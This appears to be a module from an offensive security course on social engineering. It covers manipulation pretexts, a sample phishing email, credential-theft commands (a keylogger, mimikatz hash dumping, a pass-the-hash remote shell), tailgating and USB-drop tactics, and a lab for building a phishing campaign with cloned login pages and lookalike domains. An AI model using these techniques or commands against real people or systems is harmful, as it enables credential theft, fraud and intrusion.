Module 17: Social Engineering

MODULE 17/22 ● LIVE TESTED CLASSIFICATION: RESTRICTED

Humans are the weakest link. Not because they're stupid — because they're helpful, busy, and trusting. Social engineering doesn't exploit software. It exploits psychology. The goal is not to hack a computer. It's to make a human want to help you, need to act fast, or fear the consequences of inaction.

Imagine you're a spy in hostile territory. You don't speak the language, you don't have papers, and you need to get past a checkpoint. Do you shoot your way through? No — you find the guard who misses his family, the clerk who wants to go home early, the officer who fears his boss more than he fears you. You become what they need. That's social engineering. This module teaches you to become what the target needs.

SECTION 01

The Pretext

A pretext is the fictional scenario you create to manipulate someone. "I'm IT support." "I'm the new guy." "I'm your boss's assistant." The pretext gives you a reason to ask for what you want.

// The Four Horsemen of Social Engineering URGENCY: "Your account will be locked in 15 minutes" AUTHORITY: "This is the IT Security Director" FEAR: "We've detected unauthorized access to your account" HELPFULNESS: "I need your help to fix a system issue" // Combine two or more for maximum effect // Urgency + Authority = "IT Director, account lock imminent" // Fear + Helpfulness = "Hack detected, help me verify your identity"
Why pretexts work

The human brain is optimized for social cooperation, not security verification. When someone appears to be in authority, needs help, or creates urgency, the default response is compliance. Security training tries to override this — but most people haven't had training, and those who have forget it under stress.

SECTION 02

Phishing: The Digital Con

Phishing is social engineering via email. The email looks legitimate, the link looks real, and the landing page is a perfect clone. The user enters their credentials — and you've captured them.

Subject: URGENT: Password Reset Required — Action Needed Within 24 Hours From: security@microsoft.com Dear Valued User, We have detected unusual activity on your account. To prevent unauthorized access, you must verify your identity immediately. [Verify Account] ← links to attacker-controlled clone Failure to respond within 24 hours will result in account suspension. Microsoft Security Team
⚠ Red flags the user should see
  • "security@microsoft.com" — real Microsoft uses @microsoft.com, not subdomains
  • "URGENT" and "24 hours" — urgency is a manipulation tactic
  • Generic greeting — "Valued User" instead of your name
  • Hover the link — the URL is not microsoft.com

SECTION 03

Credential Harvesting

Once you have credentials, you have access. But how do you get them? Phishing is one way. There are others.

// Method 1: Keylogger Install: phantom_rpc.exe --keylog --output C:\temp\keys.log Wait: User logs in to email, banking, VPN Collect: keys.log contains every keystroke // Method 2: Credential Dump (requires SYSTEM) Dump: mimikatz.exe "sekurlsa::logonpasswords" exit Result: NTLM hashes for all logged-in users // Method 3: Pass-the-Hash (no password needed) Use: pth-winexe -U administrator%[HASH] //192.168.1.145 cmd.exe Result: Remote shell without knowing the password
SECTION 04

Physical Access

Sometimes the best hack is walking in the door. Tailgating, fake badges, and "I forgot my keycard" are surprisingly effective.

// Tailgating: Follow someone through a secure door You: "Hey, can you hold that? My hands are full." Target: "Sure." (holds door, doesn't check badge) // Fake badge: Print a plausible-looking ID Badge: "VISITOR — IT Support — Expires Today" Worn: Backwards, "accidentally", so photo is hidden // The USB drop: Leave infected drives in the parking lot Label: "Q4 Financial Results — CONFIDENTIAL" Result: Curiosity + authority = autorun execution
⚠ USB drop defense

Modern Windows has autorun disabled by default. But users still double-click. The defense is not technical — it's training. "Never plug in unknown USB devices." But training fails. The real defense: epoxy the USB ports.

SECTION 05

Lab Exercise: Build a Phishing Campaign

Build a phishing email and landing page for a fictional company. Test it on yourself first.

  1. Choose a target company (real or fictional)
  2. Identify a service they use (Office 365, Gmail, VPN)
  3. Clone the login page (Save Page As, modify form action)
  4. Register a lookalike domain (office365-login.com, micros0ft.com)
  5. Write the email (urgency + authority + fear)
  6. Send to yourself — does it fool you?
  7. Send to a test group — track open rates, click rates, credential submission

KEY TAKEAWAYS

What You Learned

  • Social engineering exploits psychology, not software: Urgency, authority, fear, and helpfulness are the levers
  • Phishing is the most common initial access vector: 91% of cyberattacks start with phishing
  • Cloned pages are trivial: Save Page As + modify form action = perfect clone
  • Physical access is often easier than remote: Tailgating, USB drops, fake badges
  • Credentials are the keys: Harvest them, dump them, pass them — once you have them, the network is yours
